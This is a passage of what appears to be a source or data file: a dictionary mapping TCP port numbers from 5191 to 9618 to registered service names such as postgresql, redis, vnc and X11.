                                   5191: 'aol-1', 5192: 'aol-2', 5193: 'aol-3', 5194: 'cpscomm', 5195: 'ampl-lic', 5196: 'ampl-tableproxy', 5197: 'tunstall-lwp', 5200: 'targus-getdata',
                                   5201: 'targus-getdata1',
                                   5202: 'targus-getdata2', 5203: 'targus-getdata3', 5209: 'nomad', 5215: 'noteza', 5221: '3exmp', 5222: 'xmpp-client', 5223: 'hpvirtgrp', 5224: 'hpvirtctrl',
                                   5225: 'hp-server',
                                   5226: 'hp-status',
                                   5227: 'perfd', 5228: 'hpvroom', 5229: 'jaxflow', 5230: 'jaxflow-data', 5231: 'crusecontrol', 5232: 'sgi-dgl', 5233: 'enfs', 5234: 'eenet', 5235: 'galaxy-network',
                                   5236: 'padl2sim',
                                   5237: 'mnet-discovery', 5245: 'downtools', 5246: 'capwap-control', 5247: 'capwap-data', 5248: 'caacws', 5249: 'caaclang2', 5250: 'soagateway', 5251: 'caevms',
                                   5252: 'movaz-ssc',
                                   5253: 'kpdp',
                                   5254: 'logcabin', 5264: '3com-njack-1', 5265: '3com-njack-2', 5269: 'xmpp-server', 5270: 'xmp', 5271: 'cuelink', 5272: 'pk', 5280: 'xmpp-bosh', 5281: 'undo-lm',
                                   5282: 'transmit-port',
                                   5298: 'presence', 5299: 'nlg-data', 5300: 'hacl-hb', 5301: 'hacl-gs', 5302: 'hacl-cfg', 5303: 'hacl-probe', 5304: 'hacl-local', 5305: 'hacl-test',
                                   5306: 'sun-mc-grp', 5307: 'sco-aip',
                                   5308: 'cfengine', 5309: 'jprinter', 5310: 'outlaws', 5312: 'permabit-cs', 5313: 'rrdp', 5314: 'opalis-rbt-ipc', 5315: 'hacl-poll', 5317: 'hpdevms', 5318: 'pkix-cmc',
                                   5320: 'bsfserver-zn',
                                   5321: 'bsfsvr-zn-ssl', 5343: 'kfserver', 5344: 'xkotodrcp', 5349: 'stuns', 5350: 'nat-pmp-status', 5351: 'nat-pmp', 5352: 'dns-llq', 5353: 'mdns',
                                   5354: 'mdnsresponder', 5355: 'llmnr',
                                   5356: 'ms-smlbiz', 5357: 'wsdapi', 5358: 'wsdapi-s', 5359: 'ms-alerter', 5360: 'ms-sideshow', 5361: 'ms-s-sideshow', 5362: 'serverwsd2', 5363: 'net-projection',
                                   5364: 'kdnet',
                                   5397: 'stresstester',
                                   5398: 'elektron-admin', 5399: 'securitychase', 5400: 'pcduo-old', 5401: 'excerpts', 5402: 'mftp', 5403: 'hpoms-ci-lstn', 5404: 'hpoms-dps-lstn', 5405: 'pcduo',
                                   5406: 'systemics-sox',
                                   5407: 'foresyte-clear', 5408: 'foresyte-sec', 5409: 'salient-dtasrv', 5410: 'salient-usrmgr', 5411: 'actnet', 5412: 'continuus', 5413: 'wwiotalk', 5414: 'statusd',
                                   5415: 'ns-server',
                                   5416: 'sns-gateway', 5417: 'sns-agent', 5418: 'mcntp', 5419: 'dj-ice', 5420: 'cylink-c', 5421: 'netsupport2', 5422: 'salient-mux', 5423: 'virtualuser',
                                   5424: 'beyond-remote',
                                   5425: 'br-channel',
                                   5426: 'devbasic', 5427: 'sco-peer-tta', 5428: 'telaconsole', 5429: 'base', 5430: 'radec-corp', 5431: 'park-agent', 5432: 'postgresql', 5433: 'pyrrho',
                                   5434: 'sgi-arrayd', 5435: 'sceanics',
                                   5436: 'pmip6-cntl', 5437: 'pmip6-data', 5443: 'spss', 5445: 'smbdirect', 5450: 'tiepie', 5453: 'surebox', 5454: 'apc-5454', 5455: 'apc-5455', 5456: 'apc-5456',
                                   5461: 'silkmeter',
                                   5462: 'ttl-publisher', 5463: 'ttlpriceproxy', 5464: 'quailnet', 5465: 'netops-broker', 5470: 'apsolab-col', 5471: 'apsolab-cols', 5472: 'apsolab-tag',
                                   5473: 'apsolab-tags',
                                   5474: 'apsolab-rpc',
                                   5475: 'apsolab-data', 5490: 'connect-proxy', 5500: 'hotline', 5501: 'fcp-addr-srvr2', 5502: 'fcp-srvr-inst1', 5503: 'fcp-srvr-inst2', 5504: 'fcp-cics-gw1',
                                   5505: 'checkoutdb', 5506: 'amc',
                                   5507: 'psl-management', 5510: 'secureidprop', 5520: 'sdlog', 5530: 'sdserv', 5540: 'sdreport', 5550: 'sdadmind', 5553: 'sgi-eventmond', 5554: 'sgi-esphttp',
                                   5556: 'freeciv',
                                   5557: 'farenet',
                                   5560: 'isqlplus', 5565: 'hpe-dp-bura', 5566: 'westec-connect', 5567: 'm-oap', 5568: 'sdt', 5569: 'rdmnet-ctrl', 5573: 'sdmmp', 5574: 'lsi-bobcat', 5575: 'ora-oap',
                                   5579: 'fdtracks',
                                   5580: 'tmosms0',
                                   5581: 'tmosms1', 5582: 'fac-restore', 5583: 'tmo-icon-sync', 5584: 'bis-web', 5585: 'bis-sync', 5586: 'att-mt-sms', 5597: 'ininmessaging', 5598: 'mctfeed',
                                   5599: 'esinstall',
                                   5600: 'esmmanager',
                                   5601: 'esmagent', 5602: 'a1-msc', 5603: 'a1-bs', 5604: 'a3-sdunode', 5605: 'a4-sdunode', 5618: 'efr', 5627: 'ninaf', 5628: 'htrust', 5629: 'symantec-sfdb',
                                   5630: 'precise-comm',
                                   5631: 'pcanywheredata', 5632: 'pcanywherestat', 5633: 'beorl', 5634: 'xprtld', 5635: 'sfmsso', 5636: 'sfm-db-server', 5637: 'cssc', 5638: 'flcrs', 5639: 'ics',
                                   5646: 'vfmobile',
                                   5666: 'nrpe',
                                   5670: 'filemq', 5671: 'amqps', 5672: 'amqp', 5673: 'jms', 5674: 'hyperscsi-port', 5675: 'v5ua', 5676: 'raadmin', 5677: 'questdb2-lnchr', 5678: 'rrac',
                                   5679: 'activesync', 5680: 'canna',
                                   5681: 'ncxcp', 5682: 'brightcore', 5683: 'coap', 5684: 'coaps', 5687: 'gog-multiplayer', 5688: 'ggz', 5689: 'qmvideo', 5693: 'rbsystem', 5696: 'kmip',
                                   5700: 'supportassist',
                                   5705: 'storageos',
                                   5713: 'proshareaudio', 5714: 'prosharevideo', 5715: 'prosharedata', 5716: 'prosharerequest', 5717: 'prosharenotify', 5718: 'dpm', 5719: 'dpm-agent',
                                   5720: 'ms-licensing', 5721: 'dtpt',
                                   5722: 'msdfsr', 5723: 'omhs', 5724: 'omsdk', 5725: 'ms-ilm', 5726: 'ms-ilm-sts', 5727: 'asgenf', 5728: 'io-dist-data', 5729: 'openmail', 5730: 'unieng',
                                   5741: 'ida-discover1',
                                   5742: 'ida-discover2',
                                   5743: 'watchdoc-pod', 5744: 'watchdoc', 5745: 'fcopy-server', 5746: 'fcopys-server', 5747: 'tunatic', 5748: 'tunalyzer', 5750: 'rscd', 5755: 'openmailg',
                                   5757: 'x500ms',
                                   5766: 'openmailns',
                                   5767: 's-openmail', 5768: 'openmailpxy', 5769: 'spramsca', 5770: 'spramsd', 5771: 'netagent', 5777: 'dali-port', 5780: 'vts-rpc', 5781: '3par-evts',
                                   5782: '3par-mgmt',
                                   5783: '3par-mgmt-ssl',
                                   5784: 'ibar', 5785: '3par-rcopy', 5786: 'cisco-redu', 5787: 'waascluster', 5793: 'xtreamx', 5794: 'spdp', 5800: 'vnc-http', 5801: 'vnc-http-1', 5802: 'vnc-http-2',
                                   5803: 'vnc-http-3',
                                   5813: 'icmpd',
                                   5814: 'spt-automation', 5841: 'shiprush-d-ch', 5842: 'reversion', 5859: 'wherehoo', 5863: 'ppsuitemsg', 5868: 'diameters', 5883: 'jute', 5900: 'vnc', 5901: 'vnc-1',
                                   5902: 'vnc-2',
                                   5903: 'vnc-3',
                                   5910: 'cm', 5911: 'cpdlc', 5912: 'fis', 5913: 'ads-c', 5938: 'teamviewer', 5963: 'indy', 5968: 'mppolicy-v5', 5969: 'mppolicy-mgr', 5977: 'ncd-pref-tcp',
                                   5978: 'ncd-diag-tcp',
                                   5979: 'ncd-conf-tcp',
                                   5984: 'couchdb', 5985: 'wsman', 5986: 'wsmans', 5987: 'wbem-rmi', 5988: 'wbem-http', 5989: 'wbem-https', 5990: 'wbem-exp-https', 5991: 'nuxsl',
                                   5992: 'consul-insight', 5993: 'cim-rs',
                                   5997: 'ncd-pref', 5998: 'ncd-diag', 5999: 'ncd-conf', 6000: 'X11', 6001: 'X11:1', 6002: 'X11:2', 6003: 'X11:3', 6004: 'X11:4', 6005: 'X11:5', 6006: 'X11:6',
                                   6007: 'X11:7', 6008: 'X11:8',
                                   6009: 'X11:9', 6017: 'xmail-ctrl', 6050: 'arcserve', 6059: 'X11:59', 6063: 'x11', 6064: 'ndl-ahp-svc', 6065: 'winpharaoh', 6066: 'ewctsp', 6068: 'gsmp',
                                   6069: 'trip', 6070: 'messageasap',
                                   6071: 'ssdtp', 6072: 'diagnose-proc', 6073: 'directplay8', 6074: 'max', 6075: 'dpm-acm', 6076: 'msft-dpm-cert', 6077: 'iconstructsrv', 6080: 'gue', 6081: 'geneve',
                                   6082: 'p25cai',
                                   6083: 'miami-bcast', 6084: 'p2p-sip', 6085: 'konspire2b', 6086: 'pdtp', 6087: 'ldss', 6088: 'doglms', 6099: 'raxa-mgmt', 6100: 'synchronet-db', 6101: 'backupexec',
                                   6102: 'synchronet-upd',
                                   6103: 'RETS-or-BackupExec', 6104: 'dbdb', 6106: 'isdninfo', 6107: 'etc-control', 6108: 'sercomm-scadmin', 6109: 'globecast-id', 6110: 'softcm', 6111: 'spc',
                                   6112: 'dtspc',
                                   6113: 'dayliteserver',
                                   6114: 'wrspice', 6115: 'xic', 6116: 'xtlserv', 6117: 'daylitetouch', 6118: 'tipc', 6121: 'spdy', 6122: 'bex-webadmin', 6123: 'backup-express', 6124: 'pnbs',
                                   6130: 'damewaremobgtwy',
                                   6133: 'nbt-wol',
                                   6140: 'pulsonixnls', 6141: 'meta-corp', 6142: 'aspentec-lm', 6143: 'watershed-lm', 6144: 'statsci1-lm', 6145: 'statsci2-lm', 6146: 'lonewolf-lm', 6147: 'montage-lm',
                                   6148: 'ricardo-lm',
                                   6149: 'tal-pod', 6159: 'efb-aci', 6160: 'ecmp', 6161: 'patrol-ism', 6162: 'patrol-coll', 6163: 'pscribe', 6200: 'lm-x', 6201: 'thermo-calc', 6209: 'qmtps',
                                   6241: 'jeol-nsdtp-1',
                                   6242: 'jeol-nsdtp-2',
                                   6243: 'jeol-nsdtp-3', 6244: 'jeol-nsdtp-4', 6251: 'tl1-raw-ssl', 6252: 'tl1-ssh', 6253: 'crip', 6267: 'gld', 6268: 'grid', 6269: 'grid-alt', 6300: 'bmc-grx',
                                   6301: 'bmc_ctd_ldap',
                                   6306: 'ufmp',
                                   6315: 'scup', 6316: 'abb-escp', 6317: 'nav-data-cmd', 6320: 'repsvc', 6321: 'emp-server1', 6322: 'emp-server2', 6324: 'hrd-ncs', 6325: 'dt-mgmtsvc', 6326: 'dt-vra',
                                   6343: 'sflow',
                                   6344: 'streletz',
                                   6346: 'gnutella', 6347: 'gnutella2', 6350: 'adap', 6355: 'pmcs', 6360: 'metaedit-mu', 6363: 'ndn', 6370: 'metaedit-se', 6379: 'redis', 6382: 'metatude-mds',
                                   6389: 'clariion-evr01',
                                   6390: 'metaedit-ws', 6400: 'crystalreports', 6401: 'crystalenterprise', 6402: 'boe-eventsrv', 6403: 'boe-cachesvr', 6404: 'boe-filesvr', 6405: 'boe-pagesvr',
                                   6406: 'boe-processsvr',
                                   6407: 'boe-resssvr1', 6408: 'boe-resssvr2', 6409: 'boe-resssvr3', 6410: 'boe-resssvr4', 6417: 'faxcomservice', 6418: 'syserverremote', 6419: 'svdrp',
                                   6420: 'nim-vdrshell', 6421: 'nim-wan',
                                   6432: 'pgbouncer', 6442: 'tarp', 6443: 'sun-sr-https', 6444: 'sge_qmaster', 6445: 'sge_execd', 6446: 'mysql-proxy', 6455: 'skip-cert-recv', 6456: 'skip-cert-send',
                                   6464: 'ieee11073-20701',
                                   6471: 'lvision-lm', 6480: 'sun-sr-http', 6481: 'servicetags', 6482: 'ldoms-mgmt', 6483: 'SunVTS-RMI', 6484: 'sun-sr-jms', 6485: 'sun-sr-iiop', 6486: 'sun-sr-iiops',
                                   6487: 'sun-sr-iiop-aut',
                                   6488: 'sun-sr-jmx', 6489: 'sun-sr-admin', 6500: 'boks', 6501: 'boks_servc', 6502: 'netop-rc', 6503: 'boks_clntd', 6505: 'badm_priv', 6506: 'badm_pub',
                                   6507: 'bdir_priv', 6508: 'bdir_pub',
                                   6509: 'mgcs-mfp-port', 6510: 'mcer-port', 6511: 'dccp-udp', 6513: 'netconf-tls', 6514: 'syslog-tls', 6515: 'elipse-rec', 6544: 'mythtv', 6548: 'powerchuteplus',
                                   6549: 'apc-6549',
                                   6550: 'fg-sysupdate', 6551: 'sum', 6558: 'xdsxdm', 6566: 'sane-port', 6567: 'esp', 6568: 'canit_store', 6579: 'affiliate', 6580: 'parsec-master',
                                   6581: 'parsec-peer', 6582: 'parsec-game',
                                   6583: 'joaJewelSuite', 6588: 'analogx', 6600: 'mshvlm', 6601: 'mstmg-sstp', 6602: 'wsscomfrmwk', 6619: 'odette-ftps', 6620: 'kftp-data', 6621: 'kftp', 6622: 'mcftp',
                                   6623: 'ktelnet',
                                   6624: 'datascaler-db', 6625: 'datascaler-ctl', 6626: 'wago-service', 6627: 'nexgen', 6628: 'afesc-mc', 6629: 'nexgen-aux', 6632: 'mxodbc-connect',
                                   6633: 'cisco-vpath-tun', 6634: 'mpls-pm',
                                   6635: 'mpls-udp', 6636: 'mpls-udp-dtls', 6640: 'ovsdb', 6653: 'openflow', 6655: 'pcs-sf-ui-man', 6656: 'emgmsg', 6657: 'palcom-disc', 6662: 'radmind', 6670: 'irc',
                                   6671: 'p4p-portal',
                                   6672: 'vision_server', 6673: 'vision_elmd', 6678: 'vfbp', 6679: 'osaut', 6687: 'clever-ctrace', 6688: 'clever-tcpip', 6689: 'tsa', 6690: 'cleverdetect',
                                   6696: 'babel', 6697: 'ircs-u',
                                   6699: 'napster', 6701: 'carracho', 6702: 'e-design-net', 6703: 'e-design-web', 6714: 'ibprotocol', 6715: 'fibotrader-com', 6716: 'princity-agent',
                                   6767: 'bmc-perf-agent',
                                   6768: 'bmc-perf-mgrd',
                                   6769: 'adi-gxp-srvprt', 6770: 'plysrv-http', 6771: 'plysrv-https', 6777: 'ntz-tracker', 6778: 'ntz-p2p-storage', 6784: 'bfd-lag', 6785: 'dgpf-exchg',
                                   6786: 'smc-jmx', 6787: 'smc-admin',
                                   6788: 'smc-http', 6789: 'ibm-db2-admin', 6790: 'hnmp', 6791: 'hnm', 6801: 'acnet', 6817: 'pentbox-sim', 6831: 'ambit-lm', 6841: 'netmo-default', 6842: 'netmo-http',
                                   6850: 'iccrushmore',
                                   6868: 'acctopus-cc', 6881: 'bittorrent-tracker', 6888: 'muse', 6900: 'rtimeviewer', 6901: 'jetstream', 6935: 'ethoscan', 6936: 'xsmsvc', 6946: 'bioserver',
                                   6951: 'otlp', 6961: 'jmact3',
                                   6962: 'jmevt2', 6963: 'swismgr1', 6964: 'swismgr2', 6965: 'swistrap', 6966: 'swispol', 6969: 'acmsoda', 6970: 'conductor', 6997: 'MobilitySrv', 6998: 'iatp-highpri',
                                   6999: 'iatp-normalpri',
                                   7000: 'afs3-fileserver', 7001: 'afs3-callback', 7002: 'afs3-prserver', 7003: 'afs3-vlserver', 7004: 'afs3-kaserver', 7005: 'afs3-volser', 7006: 'afs3-errors',
                                   7007: 'afs3-bos',
                                   7008: 'afs3-update',
                                   7009: 'afs3-rmtsys', 7010: 'ups-onlinet', 7011: 'talon-disc', 7012: 'talon-engine', 7013: 'microtalon-dis', 7014: 'microtalon-com', 7015: 'talon-webserver',
                                   7016: 'spg', 7017: 'grasp',
                                   7018: 'fisa-svc', 7019: 'doceri-ctl', 7020: 'dpserve', 7021: 'dpserveadmin', 7022: 'ctdp', 7023: 'ct2nmcs', 7024: 'vmsvc', 7025: 'vmsvc-2', 7026: 'loreji-panel',
                                   7030: 'op-probe',
                                   7031: 'iposplanet',
                                   7040: 'quest-disc', 7070: 'realserver', 7071: 'iwg1', 7072: 'iba-cfg', 7073: 'martalk', 7080: 'empowerid', 7088: 'zixi-transport', 7095: 'jdp-disc',
                                   7099: 'lazy-ptop',
                                   7100: 'font-service',
                                   7101: 'elcn', 7107: 'aes-x170', 7117: 'rothaga', 7121: 'virprot-lm', 7128: 'scenidm', 7129: 'scenccs', 7161: 'cabsm-comm', 7162: 'caistoragemgr',
                                   7163: 'cacsambroker', 7164: 'fsr',
                                   7165: 'doc-server', 7166: 'aruba-server', 7167: 'casrmagent', 7168: 'cnckadserver', 7169: 'ccag-pib', 7170: 'nsrp', 7171: 'drm-production', 7172: 'metalbend',
                                   7173: 'zsecure',
                                   7174: 'clutild',
                                   7181: 'janus-disc', 7200: 'fodms', 7201: 'dlip', 7202: 'pon-ictp', 7215: 'PS-Server', 7216: 'PS-Capture-Pro', 7227: 'ramp', 7228: 'citrixupp', 7229: 'citrixuppg',
                                   7235: 'aspcoordination',
                                   7236: 'display', 7237: 'pads', 7244: 'frc-hicp', 7262: 'cnap', 7272: 'watchme-7272', 7273: 'openmanage', 7274: 'oma-rlp-s', 7275: 'oma-ulp', 7276: 'oma-ilp',
                                   7277: 'oma-ilp-s',
                                   7278: 'oma-dcdocbs',
                                   7279: 'ctxlic', 7280: 'itactionserver1', 7281: 'itactionserver2', 7282: 'mzca-action', 7283: 'genstat', 7326: 'icb', 7359: 'swx', 7365: 'lcm-server',
                                   7391: 'mindfilesys',
                                   7392: 'mrssrendezvous',
                                   7393: 'nfoldman', 7394: 'fse', 7395: 'winqedit', 7397: 'hexarc', 7400: 'rtps-discovery', 7401: 'rtps-dd-ut', 7402: 'rtps-dd-mt', 7410: 'ionixnetmon',
                                   7411: 'daqstream', 7420: 'ipluminary',
                                   7421: 'mtportmon', 7426: 'pmdmgr', 7427: 'oveadmgr', 7428: 'ovladmgr', 7429: 'opi-sock', 7430: 'xmpv7', 7431: 'pmd', 7437: 'faximum', 7443: 'oracleas-https',
                                   7464: 'pythonds',
                                   7471: 'sttunnel',
                                   7473: 'rise', 7474: 'neo4j', 7478: 'openit', 7491: 'telops-lmd', 7500: 'silhouette', 7501: 'ovbus', 7508: 'adcp', 7509: 'acplt', 7510: 'ovhpas', 7511: 'pafec-lm',
                                   7542: 'saratoga',
                                   7543: 'atul',
                                   7544: 'nta-ds', 7545: 'nta-us', 7546: 'cfs', 7547: 'cwmp', 7548: 'tidp', 7549: 'nls-tl', 7550: 'cloudsignaling', 7551: 'controlone-con', 7560: 'sncp', 7563: 'cfw',
                                   7566: 'vsi-omega',
                                   7569: 'dell-eql-asm', 7570: 'aries-kfinder', 7574: 'coherence', 7588: 'sun-lm', 7597: 'qaz', 7606: 'mipi-debug', 7624: 'indi', 7626: 'simco', 7627: 'soap-http',
                                   7628: 'zen-pawn',
                                   7629: 'xdas',
                                   7630: 'hawk', 7631: 'tesla-sys-msg', 7633: 'pmdfmgt', 7634: 'hddtemp', 7648: 'cuseeme', 7663: 'rome', 7672: 'imqstomp', 7673: 'imqstomps', 7674: 'imqtunnels',
                                   7675: 'imqtunnel',
                                   7676: 'imqbrokerd',
                                   7677: 'sun-user-https', 7680: 'pando-pub', 7683: 'dmt', 7687: 'bolt', 7689: 'collaber', 7697: 'klio', 7700: 'em7-secom', 7701: 'nfapi', 7707: 'sync-em7',
                                   7708: 'scinet',
                                   7720: 'medimageportal',
                                   7724: 'nsdeepfreezectl', 7725: 'nitrogen', 7726: 'freezexservice', 7727: 'trident-data', 7728: 'osvr', 7734: 'smip', 7738: 'aiagent', 7741: 'scriptview',
                                   7742: 'msss', 7743: 'sstp-1',
                                   7744: 'raqmon-pdu', 7747: 'prgp', 7775: 'inetfs', 7777: 'cbt', 7778: 'interwise', 7779: 'vstat', 7781: 'accu-lmgr', 7784: 's-bfd', 7786: 'minivend',
                                   7787: 'popup-reminders',
                                   7789: 'office-tools',
                                   7794: 'q3ade', 7797: 'pnet-conn', 7798: 'pnet-enc', 7799: 'altbsdp', 7800: 'asr', 7801: 'ssp-client', 7802: 'vns-tp', 7810: 'rbt-wanopt', 7845: 'apc-7845',
                                   7846: 'apc-7846',
                                   7847: 'csoauth',
                                   7869: 'mobileanalyzer', 7870: 'rbt-smc', 7871: 'mdm', 7872: 'mipv6tls', 7878: 'owms', 7880: 'pss', 7887: 'ubroker', 7900: 'mevent', 7901: 'tnos-sp', 7902: 'tnos-dp',
                                   7903: 'tnos-dps',
                                   7913: 'qo-secure', 7932: 't2-drm', 7933: 't2-brm', 7937: 'nsrexecd', 7938: 'lgtomapper', 7962: 'generalsync', 7967: 'supercell', 7979: 'micromuse-ncps',
                                   7980: 'quest-vista',
                                   7981: 'sossd-collect',
                                   7982: 'sossd-agent', 7997: 'pushns', 7998: 'usicontentpush', 7999: 'irdmi2', 8000: 'http-alt', 8001: 'vcom-tunnel', 8002: 'teradataordbms', 8003: 'mcreport',
                                   8004: 'p2pevolvenet',
                                   8005: 'mxi',
                                   8006: 'wpl-analytics', 8007: 'ajp12', 8008: 'http', 8009: 'ajp13', 8010: 'xmpp', 8015: 'cfg-cloud', 8016: 'ads-s', 8019: 'qbdb', 8020: 'intu-ec-svcdisc',
                                   8021: 'ftp-proxy',
                                   8022: 'oa-system',
                                   8023: 'arca-api', 8025: 'ca-audit-da', 8026: 'ca-audit-ds', 8032: 'pro-ed', 8033: 'mindprint', 8034: 'vantronix-mgmt', 8040: 'ampify', 8041: 'enguity-xccetp',
                                   8042: 'fs-agent',
                                   8043: 'fs-server',
                                   8044: 'fs-mgmt', 8051: 'rocrail', 8052: 'senomix01', 8053: 'senomix02', 8054: 'senomix03', 8055: 'senomix04', 8056: 'senomix05', 8057: 'senomix06',
                                   8058: 'senomix07', 8059: 'senomix08',
                                   8060: 'aero',
                                   8066: 'toad-bi-appsrvr', 8067: 'infi-async', 8070: 'ucs-isc', 8074: 'gadugadu', 8076: 'slnp', 8077: 'mles', 8080: 'http-proxy', 8081: 'blackice-icecap',
                                   8082: 'blackice-alerts',
                                   8083: 'us-srv',
                                   8086: 'd-s-n', 8087: 'simplifymedia', 8088: 'radan-http', 8090: 'opsmessaging', 8091: 'jamlink', 8097: 'sac', 8100: 'xprint-server', 8101: 'ldoms-migr',
                                   8102: 'kz-migr',
                                   8115: 'mtl8000-matrix',
                                   8116: 'cp-cluster', 8117: 'purityrpc', 8118: 'privoxy', 8121: 'apollo-data', 8122: 'apollo-admin', 8123: 'polipo', 8128: 'paycash-online', 8129: 'paycash-wbp',
                                   8130: 'indigo-vrmi',
                                   8131: 'indigo-vbcp', 8132: 'dbabble', 8140: 'puppet', 8148: 'isdd', 8149: 'eor-game', 8153: 'quantastor', 8160: 'patrol', 8161: 'patrol-snmp', 8162: 'lpar2rrd',
                                   8181: 'intermapper',
                                   8182: 'vmware-fdm', 8183: 'proremote', 8184: 'itach', 8190: 'gcp-rphy', 8191: 'limnerpressure', 8194: 'sophos', 8195: 'blp2', 8199: 'vvr-data', 8200: 'trivnet1',
                                   8201: 'trivnet2',
                                   8202: 'aesop',
                                   8204: 'lm-perfworks', 8205: 'lm-instmgr', 8206: 'lm-dta', 8207: 'lm-sserver', 8208: 'lm-webwatcher', 8211: 'aruba-papi', 8230: 'rexecj', 8231: 'hncp-udp-port',
                                   8232: 'hncp-dtls-port',
                                   8243: 'synapse-nhttps', 8266: 'espeasy-p2p', 8270: 'robot-remote', 8276: 'pando-sec', 8280: 'synapse-nhttp', 8282: 'libelle', 8292: 'blp3', 8293: 'hiperscan-id',
                                   8294: 'blp4', 8300: 'tmi',
                                   8301: 'amberon', 8313: 'hub-open-net', 8320: 'tnp-discover', 8321: 'tnp', 8322: 'garmin-marine', 8333: 'bitcoin', 8351: 'server-find', 8376: 'cruise-enum',
                                   8377: 'cruise-swroute',
                                   8378: 'cruise-config', 8379: 'cruise-diags', 8380: 'cruise-update', 8383: 'm2mservices', 8384: 'marathontp', 8400: 'cvd', 8401: 'sabarsd', 8402: 'abarsd',
                                   8403: 'admind', 8404: 'svcloud',
                                   8405: 'svbackup', 8415: 'dlpx-sp', 8416: 'espeech', 8417: 'espeech-rtp', 8423: 'aritts', 8442: 'cybro-a-bus', 8443: 'https-alt', 8444: 'pcsync-http', 8445: 'copy',
                                   8450: 'npmp',
                                   8457: 'nexentamv',
                                   8470: 'cisco-avp', 8471: 'pim-port', 8472: 'otv', 8473: 'vp2p', 8474: 'noteshare', 8500: 'fmtp', 8501: 'cmtp-mgt', 8502: 'ftnmtp', 8503: 'lsp-self-ping',
                                   8554: 'rtsp-alt', 8555: 'd-fence',
                                   8567: 'oap-admin', 8600: 'asterix', 8609: 'canon-cpp-disc', 8610: 'canon-mfnp', 8611: 'canon-bjnp1', 8612: 'canon-bjnp2', 8613: 'canon-bjnp3', 8614: 'canon-bjnp4',
                                   8615: 'imink',
                                   8665: 'monetra',
                                   8666: 'monetra-admin', 8675: 'msi-cps-rm', 8686: 'sun-as-jmxrmi', 8688: 'openremote-ctrl', 8699: 'vnyx', 8711: 'nvc', 8732: 'dtp-net', 8733: 'ibus',
                                   8750: 'dey-keyneg',
                                   8763: 'mc-appserver',
                                   8764: 'openqueue', 8765: 'ultraseek-http', 8766: 'amcs', 8770: 'apple-iphoto', 8778: 'uec', 8786: 'msgclnt', 8787: 'msgsrvr', 8793: 'acd-pm', 8800: 'sunwebadmin',
                                   8804: 'truecm',
                                   8805: 'pfcp',
                                   8807: 'hes-clip', 8808: 'ssports-bcast', 8809: '3gpp-monp', 8834: 'nessus-xmlrpc', 8873: 'dxspider', 8880: 'cddbp-alt', 8881: 'galaxy4d', 8883: 'secure-mqtt',
                                   8888: 'sun-answerbook',
                                   8889: 'ddi-tcp-2', 8890: 'ddi-tcp-3', 8891: 'ddi-tcp-4', 8892: 'seosload', 8893: 'ddi-tcp-6', 8894: 'ddi-tcp-7', 8899: 'ospf-lite', 8900: 'jmb-cds1',
                                   8901: 'jmb-cds2',
                                   8910: 'manyone-http',
                                   8911: 'manyone-xml', 8912: 'wcbackup', 8913: 'dragonfly', 8937: 'twds', 8953: 'ub-dns-control', 8954: 'cumulus-admin', 8980: 'nod-provider', 8981: 'nod-client',
                                   8989: 'sunwebadmins',
                                   8990: 'http-wmap', 8991: 'https-wmap', 8997: 'oracle-ms-ens', 8998: 'canto-roboflow', 8999: 'bctp', 9000: 'cslistener', 9001: 'tor-orport', 9002: 'dynamid',
                                   9005: 'golem',
                                   9007: 'ogs-client',
                                   9008: 'ogs-server', 9009: 'pichat', 9010: 'sdr', 9011: 'd-star', 9020: 'tambora', 9021: 'panagolin-ident', 9022: 'paragent', 9023: 'swa-1', 9024: 'swa-2',
                                   9025: 'swa-3', 9026: 'swa-4',
                                   9040: 'tor-trans', 9050: 'tor-socks', 9051: 'tor-control', 9060: 'CardWeb-IO', 9080: 'glrpc', 9081: 'cisco-aqos', 9083: 'emc-pp-mgmtsvc', 9084: 'aurora',
                                   9085: 'ibm-rsyscon',
                                   9086: 'net2display',
                                   9087: 'classic', 9088: 'sqlexec', 9089: 'sqlexec-ssl', 9090: 'zeus-admin', 9091: 'xmltec-xmlmail', 9092: 'XmlIpcRegSvc', 9093: 'copycat', 9107: 'jetdirect',
                                   9111: 'DragonIDSConsole',
                                   9119: 'mxit',
                                   9122: 'grcmp', 9123: 'grcp', 9131: 'dddp', 9152: 'ms-sql2000', 9160: 'apani1', 9161: 'apani2', 9162: 'apani3', 9163: 'apani4', 9164: 'apani5', 9191: 'sun-as-jpda',
                                   9200: 'wap-wsp',
                                   9201: 'wap-wsp-wtp', 9202: 'wap-wsp-s', 9203: 'wap-wsp-wtp-s', 9204: 'wap-vcard', 9205: 'wap-vcal', 9206: 'wap-vcard-s', 9207: 'wap-vcal-s', 9208: 'rjcdb-vcards',
                                   9209: 'almobile-system',
                                   9210: 'oma-mlp', 9211: 'oma-mlp-s', 9212: 'serverviewdbms', 9213: 'serverstart', 9214: 'ipdcesgbs', 9215: 'insis', 9216: 'acme', 9217: 'fsc-port',
                                   9222: 'teamcoherence', 9255: 'mon',
                                   9277: 'traingpsdata', 9278: 'pegasus', 9279: 'pegasus-ctl', 9280: 'pgps', 9281: 'swtp-port1', 9282: 'swtp-port2', 9283: 'callwaveiam', 9284: 'visd',
                                   9285: 'n2h2server', 9286: 'n2receive',
                                   9287: 'cumulus', 9292: 'armtechdaemon', 9293: 'storview', 9294: 'armcenterhttp', 9295: 'armcenterhttps', 9300: 'vrace', 9306: 'sphinxql', 9312: 'sphinxapi',
                                   9318: 'secure-ts',
                                   9321: 'guibase',
                                   9333: 'litecoin', 9339: 'gnmi-gnoi', 9343: 'mpidcmgr', 9344: 'mphlpdmc', 9345: 'rancher', 9346: 'ctechlicensing', 9374: 'fjdmimgr', 9380: 'boxp', 9387: 'd2dconfig',
                                   9388: 'd2ddatatrans',
                                   9389: 'adws', 9390: 'otp', 9396: 'fjinvmgr', 9397: 'mpidcagt', 9400: 'sec-t4net-srv', 9401: 'sec-t4net-clt', 9402: 'sec-pc2fax-srv', 9418: 'git',
                                   9443: 'tungsten-https',
                                   9444: 'wso2esb-console',
                                   9445: 'mindarray-ca', 9450: 'sntlkeyssrvr', 9500: 'ismserver', 9522: 'sma-spw', 9535: 'man', 9536: 'laes-bf', 9555: 'trispen-sra', 9592: 'ldgateway', 9593: 'cba8',
                                   9594: 'msgsys',
                                   9595: 'pds',
                                   9596: 'mercury-disc', 9597: 'pd-admin', 9598: 'vscp', 9599: 'robix', 9600: 'micromuse-ncpw', 9612: 'streamcomm-ds', 9614: 'iadt-tls', 9616: 'erunbook_agent',
                                   9617: 'erunbook_server',
                                   9618: 'condor',
